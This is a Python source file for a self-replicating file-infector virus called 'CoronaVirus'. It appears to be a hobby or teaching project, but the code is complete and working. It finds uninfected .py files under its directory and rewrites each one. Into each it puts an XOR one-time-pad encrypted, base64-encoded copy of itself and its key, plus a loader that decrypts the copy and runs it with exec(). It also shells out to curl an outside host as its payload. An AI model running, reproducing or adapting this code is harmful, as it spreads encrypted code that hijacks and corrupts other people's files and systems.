###INITIAL_VIRUS###
import os, random, string, requests, base64
from pathlib import Path

class CoronaVirus:

	def __init__(self):

		self.absoluteFilePath = Path(__file__).absolute()

		with open(self.absoluteFilePath, 'r') as file:
			self.fileContent = file.read()
			self.virusCode   = self.fileContent[:4027]
			self.mrRobotCode = self.fileContent[4027:]

	# One Time Pad function that uses XOR
	def oneTimePad(self, content, key):
		return ''.join([chr(ord(x)^ord(y)) for x, y in zip(content, key)])

	# Encryption Helper to safely send the code content
	def base64_Encoding(self, content):
		content_ascii = content.encode('ascii')
		content_ascii_base64 = base64.b64encode(content_ascii)
		content_base64 = content_ascii_base64.decode('ascii')
		return content_base64

	# Given code content and the key, it encrypts the content
	def encrypt(self, original, key):
		encrypted = self.oneTimePad(original, key)
		return self.base64_Encoding(encrypted)

	# Decryption Helper to safely send the code content
	def base64_Decoding(self, content_base64):
			content_ascii_base64 = content_base64.encode('ascii')
			content_ascii = base64.b64decode(content_ascii_base64)
			content = content_ascii.decode('ascii')
			return content

	# Given the encrypted base64 code content and the key, it decrypts the content
	def decrypt(self, encrypted_base64, key):
		encrypted = self.base64_Decoding(encrypted_base64)
		return self.oneTimePad(encrypted, key)

	# Find Uninfected Python Files
	def search(self):
		uninfectedFiles = []
		files = list(Path(self.absoluteFilePath.parent).rglob('*.py'))  # Retrieve all python files on current directory

		for file in files:

			if file == self.absoluteFilePath:	continue      # Skip current file since it has already infected
			
			with open(file,'r') as currentFile:
				currentFileContent = currentFile.read()
				if currentFileContent.startswith("###INITIAL_VIRUS###"):	continue  # Don't add intial virus file
				if currentFileContent.startswith("###INFECTED###"):				continue  # Don't add other infected files
			
			uninfectedFiles.append(file)
			
		return uninfectedFiles

	# Create a random key elements with the given length
	def createKey(self, length):
		return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(length))

	# This function create a encrypted copy of the virus class code
	# and add a decryption key in its next line. 
	def encryptedCopy(self, virusContent):
		key = self.createKey(len(virusContent))
		encryptedContent = self.encrypt(virusContent, key)
		return '###' + encryptedContent + '\n' + '###' + key + '\n'


	# Infects uninfected python files from the current dir and its subdirectories.
	def infect(self):

		# `virusContent`   Part is actual virus class code that will be encrypted and run on other files
		# `mrRobotContent` Part is the non encrypted code that runs to decrypt first part when the infected file executed.

		# If current file is the initial virus file, just split its content to two part
		if self.virusCode.startswith("###INITIAL_VIRUS###"):
			virusContent   = self.virusCode[20:]
			mrRobotContent = self.mrRobotCode

		# If current file is infected file, decrypt its content and then split its content
		else:
			_ , encrypted_base64, key, *other = self.fileContent.split('\n')
			virusContent   = self.decrypt(encrypted_base64[3:], key[3:])
			mrRobotContent = '\n'.join(other[:25])
		
		uninfectedFiles = self.search()
		for uninfectedFile in uninfectedFiles:
			with open(uninfectedFile, 'r') as f:	tempContent = f.read()

			# First  Line: Infected Label 
			# Second Line: Encrypted virusClass code
			# Third  Line: Key to decrypt it
			# Rests			 : Orijinal File Content
			with open(uninfectedFile, 'w') as f:
				f.write('###INFECTED###\n')
				f.write(self.encryptedCopy(virusContent))
				f.write(mrRobotContent + '\n')
				f.write(tempContent)

	def payload(self):  
		os.system("curl https://corona-stats.online")

covid19 = CoronaVirus()
covid19.infect()
covid19.payload()

##############################################################################################
from pathlib import Path
import base64

def mrRobot():
	with open(Path(__file__).absolute(), 'r') as file:
		fileContent = file.read()

		# For the acutal virus file, we don't need to decrypt
		if fileContent.startswith("###INITIAL_VIRUS###"): return

		# Perform decryption and run the infected part.
		_, encrypted_base64, key, *_ = fileContent.split('\n')
	
	# Since this function runs independently from the rest of the code,
	# we have to hardcode decrypt and OTP functionality within it
	encrypted_ascii_base64 = encrypted_base64[3:].encode('ascii')
	encrypted_ascii = base64.b64decode(encrypted_ascii_base64)
	encrypted = encrypted_ascii.decode('ascii')
	original = ''.join([chr(ord(x)^ord(y)) for x, y in zip(encrypted, key[3:])])
	exec(original, globals())

mrRobot()
##############################################################################################